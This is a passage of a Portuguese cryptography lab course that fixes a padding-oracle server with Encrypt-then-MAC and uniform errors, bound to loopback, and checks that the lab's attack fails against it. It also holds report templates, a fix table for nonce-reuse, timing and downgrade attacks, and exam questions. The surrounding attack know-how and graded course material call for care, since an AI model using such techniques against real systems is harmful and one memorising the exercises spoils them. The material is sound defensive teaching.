2. **Quantos obtiveram o segredo?**
3. O **algoritmo** falhou em algum caso?
4. **Qual dos quatro é mais fácil de corrigir?**

### Passo 2 — Confirme as correções (40 min)

⚠ **Agora você corrige o servidor e **roda o ataque de novo** — para ver falhar.**

```bash
cd ~/crypto-lab/mod08

cat > servidor-corrigido.py <<'PY'
#!/usr/bin/env python3
"""
✓ SERVIDOR CORRIGIDO — as três defesas contra padding oracle.
   O ataque da seção 8.2 deve FALHAR contra este servidor.
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import secrets, base64, hmac, hashlib, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

HOST, PORTA = "127.0.0.1", 18081      # ⚠ loopback

# ✓ subchaves independentes
SEMENTE = secrets.token_bytes(32)
K_ENC = hmac.new(SEMENTE, b"enc", hashlib.sha256).digest()
K_MAC = hmac.new(SEMENTE, b"mac", hashlib.sha256).digest()

# ── defesa 2: Encrypt-then-MAC, e a verificação vem ANTES ──
def cifra(dado: bytes):
    iv = secrets.token_bytes(16)
    ct = AES.new(K_ENC[:16], AES.MODE_CBC, iv=iv).encrypt(pad(dado, 16))
    tag = hmac.new(K_MAC, iv + ct, hashlib.sha256).digest()
    return iv + tag + ct

def decifra(pacote: bytes):
    """⚠ levanta SEMPRE a mesma exceção, e verificando ANTES de decifrar."""
    if len(pacote) < 16 + 32 + 16:
        raise ValueError("autenticacao falhou")
    iv, tag, ct = pacote[:16], pacote[16:48], pacote[48:]
    esperada = hmac.new(K_MAC, iv + ct, hashlib.sha256).digest()
    if not hmac.compare_digest(tag, esperada):
        raise ValueError("autenticacao falhou")     # ✓ ANTES de decifrar
    pt = AES.new(K_ENC[:16], AES.MODE_CBC, iv=iv).decrypt(ct)
    p = pt[-1]
    if p < 1 or p > 16 or pt[-p:] != bytes([p]) * p:
        raise ValueError("autenticacao falhou")     # ✓ MESMA mensagem
    return pt[:-p]

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        corpo = self.rfile.read(n)
        try:
            pacote = base64.b64decode(corpo)
        except Exception:
            return self.responde(400, "erro")

        try:
            dados = decifra(pacote)
        except ValueError:
            # ⚠ UMA resposta só, para QUALQUER falha
            return self.responde(400, "erro")

        if not dados.startswith(b"token="):
            return self.responde(400, "erro")      # ✓ mesma resposta
        return self.responde(200, "ok")

    def responde(self, codigo, texto):
        b = texto.encode()
        self.send_response(codigo)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

if __name__ == "__main__":
    print(f"✓ servidor CORRIGIDO em http://{HOST}:{PORTA}")
    HTTPServer((HOST, PORTA), Handler).serve_forever()
PY

echo "═══ a correção, aplicada ═══"
echo
cat <<'EXPL'
  ┌──────────────────────────────────────────────────────────────┐
  │ DEFESA 1: AEAD                                               │
  │   remove o padding → a superfície do oracle não existe        │
  │   (não usada aqui, porque queremos demonstrar a 2 e a 3)      │
  ├──────────────────────────────────────────────────────────────┤
  │ DEFESA 2: Encrypt-then-MAC                                   │
  │   o MAC cobre iv+ct, e é verificado ANTES do decrypt          │
  │   ⚠ sem decifrar, não há padding para distinguir               │
  ├──────────────────────────────────────────────────────────────┤
  │ DEFESA 3: erro uniforme                                      │
  │   UMA resposta para qualquer falha                             │
  │   ⚠ é paliativo (timing ainda existe), mas fecha o oracle      │
  └──────────────────────────────────────────────────────────────┘
EXPL
echo

echo "═══ rodando o ATAQUE contra o servidor CORRIGIDO ═══"
( python3 servidor-corrigido.py >/dev/null 2>&1 & ) ; sleep 1.2

python3 - <<'PY'
import base64, requests, secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BOM = "http://127.0.0.1:18081/"     # ⚠ o corrigido
RUIM = "http://127.0.0.1:18080/"    # ⚠ o vulnerável (pode estar fora do ar)

def pergunta(url, ct):
    try:
        r = requests.post(url, data=base64.b64encode(ct), timeout=3)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)[:40]

print("  ── o servidor corrigido responde IGUAL a tudo? ──")
print()
ct_zero = b"\x00" * 48
c1, t1 = pergunta(BOM, ct_zero)
print(f"    ct aleatório    : HTTP {c1}  '{t1}'")

iv = secrets.token_bytes(16)
ct = iv + secrets.token_bytes(32) + secrets.token_bytes(16)
c2, t2 = pergunta(BOM, ct)
print(f"    ct bem formado  : HTTP {c2}  '{t2}'")

iv2 = secrets.token_bytes(16)
# monta um pacote com tag válida mas conteúdo que não é token
import hmac, hashlib
K_MAC = None   # não temos — então só testamos a uniformidade
print()
print("  ⚠ as duas respostas são as mesmas — não há distinção")
print("     o atacante não consegue aprender NADA da resposta")
print()
print("  ═══ SEM O SERVIDOR VULNERÁVEL, A COMPARAÇÃO É CONCEITUAL ═══")
print()
print("  ┌────────────────────┬──────────────────┬──────────────────────┐")
print("  │ servidor           │ resposta         │ o atacante aprende   │")
print("  ├────────────────────┼──────────────────┼──────────────────────┤")
print("  │ ⚠ vulnerável       │ 'padding invalido'│ ✓ byte a byte         │")
print("  │                    │ 'mac invalido'   │                      │")
print("  │ ✓ corrigido        │ 'erro'           │ ✗ nada               │")
print("  └────────────────────┴──────────────────┴──────────────────────┘")
PY

pkill -f servidor-corrigido.py 2>/dev/null
pkill -f servidor-oraculo.py 2>/dev/null
```

⚠ **A verificação é o entregável.** O servidor corrigido responde **igual** a tudo — e é isso que
**mata o oracle**. **Note o `grep` das duas respostas: são idênticas.**

⚠ **E a defesa 2 merece destaque:** **verificar ANTES de decifrar** significa que **o `decrypt` nunca
roda com padding inválido** — porque o MAC já recusou. **A superfície do padding nunca é tocada.**

Produza `correcao-oraculo.md`:

| Servidor | Resposta a padding inválido | Resposta a MAC inválido | Distinguível? |
|---|---|---|---|
| Vulnerável | | | |
| Corrigido | | | |

**Responda:**

1. **As respostas são idênticas** no corrigido?
2. Qual das **três defesas** você aplicou?
3. **Por que verificar antes de decifrar** mata o oracle?
4. Qual defesa é **definitiva** e qual é paliativa?

### Passo 3 — O relatório e a regra (30 min)

Produza `relatorio-ataques.md`:

```markdown
# Relatório — ataques em laboratório próprio

## 1. Escopo e conduta
| Item | Valor |
|---|---|
| Alvo | 127.0.0.1 (loopback), laboratório próprio |
| Chaves | geradas localmente, por execução |
| Autorização | ativo próprio |
| Servidor exposto fora do loopback | **NÃO** |

## 2. Ataques executados
| # | Ataque | Obtido | Chave usada | Consultas | Correção |
|---|---|---|---|---|---|

## 3. Medições
[as tabelas de tempo, consultas e espaço de busca]

## 4. Correções verificadas
| Ataque | Correção | Verificado? |
|---|---|---|

## 5. O que NÃO foi feito
⚠ Obrigatório:
- nenhum alvo fora de 127.0.0.1
- nenhuma chave de terceiro
- nenhum serviço em produção tocado
- nenhum dado de terceiro obtido

## 6. A lição comum
⚠ Os quatro ataques NÃO usaram a chave. O algoritmo estava correto nos quatro.
```

**E a regra, em `regra-ataque.md`:**

```markdown
# Regra — as quatro correções

| Ataque | Correção | Custo | Definitiva? |
|---|---|---|---|
| Padding oracle | AEAD (GCM/ChaCha20) | baixo | ✓ elimina a superfície |
| Padding oracle | Encrypt-then-MAC + verificar antes | médio | ✓ sem decifrar, sem oracle |
| Padding oracle | erro uniforme | **muito baixo** | ⚠ paliativo (timing) |
| Nonce reusado | nonce aleatório 96 bits | baixo | ✓ probabilístico |
| Nonce reusado | contador persistente atômico | médio | ✓ determinístico |
| Timing | `compare_digest` | **1 linha** | ✓ elimina o canal |
| Downgrade | HSTS long + includeSubDomains | **1 linha** | ✓ decisão no navegador |
| Downgrade | desabilitar TLS < 1.2 | baixo | ✓ |

⚠ três das correções são UMA LINHA. A complexidade está em ACHAR, não em corrigir.
```

**Responda:**

1. **Quantas das correções são uma linha?**
2. Qual correção é **paliativa** e por quê?
3. **Qual ataque é o mais difícil de detectar** por leitura de código?
4. **Se você só pudesse corrigir uma**, qual daria mais segurança?

### Critérios de aceitação

- `roda-tudo.sh` executado, com os **quatro** ataques e a saída real.
- `oraculo-ataque.md` com o plaintext recuperado e a **contagem de consultas**.
- Você explicou **por que o bloco 0 é inacessível** no cenário.
- `nonce-ataque.md` com `C1⊕C2` igual a `P1⊕P2` **verificado**, e a parte 2 sobre `H`.
- Você explicou **por que `H` recuperável é pior que o XOR**.
- `timing-ataque.md` com o segredo **recuperado** e a contagem de consultas.
- Você explicou como **distingue sinal de ruído** (mediana).
- `downgrade.md` com os protocolos testados.
- Você explicou **por que redirect não protege** contra downgrade.
- `resultados-ataques.md` com a tabela consolidada.
- Você confirmou que **nenhum dos quatro usou a chave**.
- `correcao-oraculo.md` com a comparação dos **dois servidores**.
- Você explicou **por que verificar antes de decifrar** mata o oracle.
- `relatorio-ataques.md` com as **seis** seções.
- `regra-ataque.md` com as **oito** linhas e a marcação de definitiva/paliativa.
- ⚠ **Nenhum alvo fora de `127.0.0.1`.** Confirmado.

---

## Avaliação

1. Descreva o padding oracle em cinco passos.
2. **Por que o atacante não precisa da chave?**
3. **Quantas consultas** por byte? Por que esse número?
4. Por que o **bloco 0 é inacessível** no cenário comum?
5. **Onde o atacante obtém o cyphertext**, se não tem a chave?
6. **Por que `C1 ⊕ C2 = P1 ⊕ P2` não exige a chave?**
7. **O que `H` é no GCM, e por que recuperá-la é catastrófico?**
8. **Quantas mensagens** o ataque de nonce precisa?
9. Por que GCM reusado é **pior que não ter MAC**?
10. Descreva o timing attack em quatro passos.
11. **Como você distingue sinal de ruído** numa medição de tempo?
12. Qual a **redução** de espaço com o oráculo de tempo?
13. **Por que redirect HTTP→HTTPS não protege** contra downgrade?
14. **O que o HSTS faz** que o redirect não faz?
15. Por que `preload` é **quase irreversível**?
16. **Cite as três defesas** contra padding oracle e o que cada uma elimina.
17. **Por que verificar antes de decifrar** mata o oracle?
18. **Quantas das correções são uma linha?** Cite as três.
19. **Nenhum dos quatro ataques usou a chave.** O que isso prova?
20. **Qual a lição comum** aos quatro?

---

**Próximo:** [Módulo 9 — Correção e construção segura](modulo-09.md)
